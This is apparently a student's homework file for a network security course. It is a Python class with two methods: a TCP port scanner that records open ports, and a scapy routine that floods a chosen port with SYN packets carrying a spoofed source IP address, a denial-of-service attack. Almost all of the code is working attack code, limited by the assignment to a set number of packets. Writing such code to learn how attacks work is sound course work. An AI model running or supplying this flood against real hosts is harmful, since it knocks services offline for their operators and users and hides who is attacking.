#!/usr/bin/python
# Homework Number:  hw08
# Name: Shu Hwai Teoh
# ECN Login: teoh0
# Due Date: Thursday 3/26/2020 at 4:29PM

import socket
import re
import os.path
from scapy.all import *


class TcpAttack:

    #spoofIP: String containing the IP address to spoof
    #targetIP: String containing the IP address of the target computer to attack
    def __init__(self,spoofIP,targetIP):
        self.spoofIP = spoofIP
        self.targetIP = targetIP
        self.open_ports = []
    
    #rangeStart: Integer designating the first port in the range of ports being scanned.
    #rangeEnd: Integer designating the last port in the range of ports being scanned
    #No return value, but writes open ports to openports.txt
    def scanTarget(self,rangeStart,rangeEnd):
        """
        This method will scan the target computer for open ports, using the range of ports passed, and
        write ALL the open ports found into an output file called openports.txt. The format of open-
        ports.txt should be one open port number per line of the file, in ascending order.
        """
        verbosity = 1
        # find all open ports and write out to a file
        for testport in range(rangeStart, rangeEnd+1):                               
            sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )               
            sock.settimeout(0.1)                                                     
            try:                                                                     
                sock.connect( (self.targetIP, testport) )                                 
                self.open_ports.append(testport)                                       
                if verbosity: 
                    print("Port opened: ", testport, flush=True)                                               
            except:
                pass                                                                
                # if verbosity: print("Port closed: ", testport, flush=True)                                                           

        with open("openports.txt", "w") as f:
            for i in self.open_ports:
                f.write(str(i)) 
                f.write("\n")

    #port: Integer designating the port that the attack will use
    #numSyn: Integer of SYN packets to send to target IP address at the given port
    #If the port is open, perform DoS attack and return 1. Otherwise return 0.
    def attackTarget(self,port,numSyn):
        """
        This method first veries the specied port is open and then performs a DoS attack on the target
        using the port. If the port is open, it should perform the DoS attack and return 1 (otherwise
        return 0 if the port passed is not open). For the purposes of this assignment, it is only necessary
        to send a number of SYN packets equal to numSyn, rather than looping innitely. You can look at
        the scripts listed in section 16.14 of the lecture notes for inspiration.
        """
        if port in self.open_ports:
            # DoS attack
            for i in range(numSyn):                                                       #(5)
                IP_header = IP(src = self.spoofIP, dst = self.targetIP)                                #(6)
                TCP_header = TCP(flags = "S", sport = RandShort(), dport = port)     #(7)
                packet = IP_header / TCP_header                                          #(8)
                try:                                                                     #(9)
                    send(packet)
                except Exception as e:                                                   #(11)
                    print(e)
            return 1
        else:
            return 0
